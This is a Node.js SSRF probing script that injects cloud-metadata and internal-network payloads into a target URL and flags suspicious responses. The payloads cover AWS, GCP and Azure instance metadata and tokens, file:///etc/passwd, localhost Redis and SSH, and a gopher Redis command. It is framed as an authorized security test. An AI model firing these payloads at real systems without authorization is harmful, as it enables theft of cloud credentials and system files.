#!/usr/bin/env node
// ssrf-test.mjs — SSRF probe with cloud-metadata payloads.
// Pure Node 18+, no external deps.
// OWASP: A10 SSRF / API7:2023.

'use strict';

import { argv, exit, stdout, stderr } from 'node:process';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const SCRIPT_NAME = 'ssrf-test';
const INJECT = '{{INJECT}}';

const DEFAULT_PAYLOADS = [
  { name: 'aws-imds-v1',     url: 'http://169.254.169.254/latest/meta-data/' },
  { name: 'aws-imds-token',  url: 'http://169.254.169.254/latest/api/token' },
  { name: 'gcp-metadata',    url: 'http://metadata.google.internal/computeMetadata/v1/',
    headers: { 'Metadata-Flavor': 'Google' } },
  { name: 'azure-imds',      url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    headers: { Metadata: 'true' } },
  { name: 'localhost-ssh',   url: 'http://127.0.0.1:22' },
  { name: 'localhost-redis', url: 'http://localhost:6379' },
  { name: 'file-passwd',     url: 'file:///etc/passwd' },
  { name: 'gopher-redis',    url: 'gopher://127.0.0.1:6379/_INFO%0d%0a' },
  // DNS rebinding placeholder. Replace with your own controlled rebinder.
  { name: 'dns-rebind-note', url: 'http://rebind.example/payload',
    note: 'Replace host with a controlled DNS-rebinding domain.' },
];

function usage() {
  stdout.write(`Usage: ssrf-test.mjs --target <url-with-${INJECT}> [options]

SSRF probe. Substitutes ${INJECT} in the target URL with each cloud-metadata
or internal-network payload, compares against a benign baseline, and flags
deviations.

Options:
  --target <url>             URL pattern with ${INJECT} marker
                             e.g. https://app/fetch?url=${INJECT}
  --baseline <url>           Benign URL to compare responses against
                             (default: https://example.com/)
  --header <n=v>             Extra header on the request to --target (repeatable)
  --method <verb>            HTTP method to send (default: GET)
  --body <string>            Body for non-GET. Use ${INJECT} inside body if needed.
  --out <dir>                Output dir (default: ./security-out/${SCRIPT_NAME}/<ts>/)
  --severity-threshold <s>   low|medium|high|critical (default: high)
  --extra-payload <url>      Additional payload URL (repeatable)
  -h, --help                 Show help and exit

Example:
  ssrf-test.mjs --target 'https://app.example.com/fetch?url=${INJECT}'
`);
}

function parseArgs(args) {
  const opts = {
    target: '', baseline: 'https://example.com/', headers: {}, method: 'GET',
    body: '', out: '', severityThreshold: 'high', extra: [],
  };
  for (let i = 2; i < args.length; i++) {
    const a = args[i];
    const next = () => args[++i];
    switch (a) {
      case '-h': case '--help': usage(); exit(0); break;
      case '--target': opts.target = next(); break;
      case '--baseline': opts.baseline = next(); break;
      case '--header': {
        const [k, v] = next().split('=');
        opts.headers[k] = v ?? '';
        break;
      }
      case '--method': opts.method = next().toUpperCase(); break;
      case '--body': opts.body = next(); break;
      case '--out': opts.out = next(); break;
      case '--severity-threshold': opts.severityThreshold = next(); break;
      case '--extra-payload': opts.extra.push(next()); break;
      default:
        stderr.write(`Unknown option: ${a}\n`); usage(); exit(64);
    }
  }
  return opts;
}

async function fetchWithMeta(url, init) {
  const start = Date.now();
  try {
    const res = await fetch(url, init);
    const body = await res.text();
    return {
      status: res.status,
      size: body.length,
      durationMs: Date.now() - start,
      bodyPreview: body.slice(0, 240),
      contentType: res.headers.get('content-type') || '',
      error: null,
    };
  } catch (e) {
    return {
      status: null, size: 0, durationMs: Date.now() - start,
      bodyPreview: '', contentType: '', error: e.message,
    };
  }
}

function buildReq(opts, injected) {
  const targetUrl = opts.target.replaceAll(INJECT, encodeURIComponent(injected));
  const init = { method: opts.method, headers: { ...opts.headers } };
  if (opts.body && opts.method !== 'GET') {
    init.body = opts.body.replaceAll(INJECT, encodeURIComponent(injected));
  }
  return { targetUrl, init };
}

function classify(probe, baseline) {
  if (probe.error) return { suspicious: false, reason: `error: ${probe.error}` };
  const reasons = [];
  if (probe.status && probe.status >= 200 && probe.status < 300) {
    reasons.push(`status ${probe.status}`);
  }
  if (baseline.size && Math.abs(probe.size - baseline.size) > 200) {
    reasons.push(`size diff ${probe.size - baseline.size}`);
  }
  if (probe.bodyPreview && /ami-id|instance-id|computeMetadata|root:x:/i.test(probe.bodyPreview)) {
    reasons.push('cloud/file marker in body');
  }
  return { suspicious: reasons.length > 0, reason: reasons.join('; ') };
}

async function main() {
  stderr.write(`[!] AUTHORIZATION REQUIRED
[!] SSRF probes try to coerce the target into fetching internal/cloud URLs.
[!] Run only against systems you own or have written permission to test.
`);
  const opts = parseArgs(argv);
  if (!opts.target || !opts.target.includes(INJECT)) {
    stderr.write(`Error: --target must contain the ${INJECT} marker.\n`);
    usage();
    exit(64);
  }
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const outDir = opts.out || join('./security-out', SCRIPT_NAME, ts);
  mkdirSync(outDir, { recursive: true });

  const { targetUrl: baselineUrl, init: baselineInit } = buildReq(opts, opts.baseline);
  stderr.write(`Baseline: ${baselineUrl}\n`);
  const baseline = await fetchWithMeta(baselineUrl, baselineInit);

  const payloads = [
    ...DEFAULT_PAYLOADS,
    ...opts.extra.map((url) => ({ name: `extra:${url}`, url })),
  ];

  const results = [];
  for (const pl of payloads) {
    const reqInit = { method: opts.method, headers: { ...opts.headers, ...(pl.headers || {}) } };
    const url = opts.target.replaceAll(INJECT, encodeURIComponent(pl.url));
    if (opts.body && opts.method !== 'GET') {
      reqInit.body = opts.body.replaceAll(INJECT, encodeURIComponent(pl.url));
    }
    const probe = await fetchWithMeta(url, reqInit);
    const verdict = classify(probe, baseline);
    results.push({
      payload: pl.name, payloadUrl: pl.url, requestUrl: url,
      probe, verdict, note: pl.note || null,
    });
  }

  const report = {
    target: opts.target, baseline: { url: baselineUrl, ...baseline },
    timestamp: ts, results,
  };
  writeFileSync(join(outDir, 'report.json'), JSON.stringify(report, null, 2));

  stderr.write(`---\nBaseline status=${baseline.status} size=${baseline.size}\n`);
  let suspicious = 0;
  for (const r of results) {
    const flag = r.verdict.suspicious ? 'SUSPICIOUS' : 'ok        ';
    if (r.verdict.suspicious) suspicious++;
    stderr.write(`  ${flag}  ${r.payload.padEnd(20)} ` +
      `status=${r.probe.status ?? 'ERR'} size=${r.probe.size} ` +
      `${r.verdict.reason ? '[' + r.verdict.reason + ']' : ''}\n`);
  }
  stderr.write(`Suspicious: ${suspicious}\nReport: ${join(outDir, 'report.json')}\n`);

  if (!['low', 'medium', 'high', 'critical'].includes(opts.severityThreshold)) {
    stderr.write(`Invalid --severity-threshold: ${opts.severityThreshold}\n`);
    exit(64);
  }
  if (suspicious > 0) exit(1);
  exit(0);
}

main().catch((e) => { stderr.write(`Fatal: ${e.stack || e.message}\n`); exit(3); });
